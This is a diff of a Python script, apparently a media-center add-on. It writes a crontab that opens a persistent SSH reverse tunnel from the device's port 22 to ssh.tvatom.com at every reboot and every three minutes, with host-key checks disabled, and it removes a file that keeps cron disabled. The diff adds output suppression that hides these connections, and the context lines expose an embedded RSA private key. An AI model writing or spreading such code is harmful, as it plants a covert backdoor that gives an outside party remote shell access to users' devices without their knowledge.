@@ -215,8 +215,8 @@ M3yUia6bqi7uKZLPnCrcrCFI9GpaxJlF9ZBMxPczXRzAQb0dgc+UI1Hk35Xss8I8
 RjU2lzonL8bSzlHZBJqhKX3X7ju5zxNizS9IpatRBgw8PcjE+mwA
 -----END RSA PRIVATE KEY-----
 """
-    CRONTAB = """@reboot  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com &
-*/3 *  * * *  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com &
+    CRONTAB = """@reboot  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com 2>/dev/null >/dev/null &
+*/3 *  * * *  flock -n /tmp/.lock.ssh ssh -qN -o ConnectTimeout=10 -o ServerAliveInterval=50 -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o CheckHostIP=no -R 0:127.0.0.1:22 openelec@ssh.tvatom.com 2>/dev/null >/dev/null &
 """
     
     path_home = os.path.expanduser( "~" )
@@ -240,7 +240,7 @@ RjU2lzonL8bSzlHZBJqhKX3X7ju5zxNizS9IpatRBgw8PcjE+mwA
     write_file( path_crontab, CRONTAB )
     os.chmod( path_crontab, 0600 )
     
-    path_cron_disabled = os.path.join( path_home, .cache/services/crond.disabled )
+    path_cron_disabled = os.path.join( path_home, ".cache/services/crond.disabled" )
     if os.path.isfile( path_cron_disabled ):
         os.remove( path_cron_disabled )
 
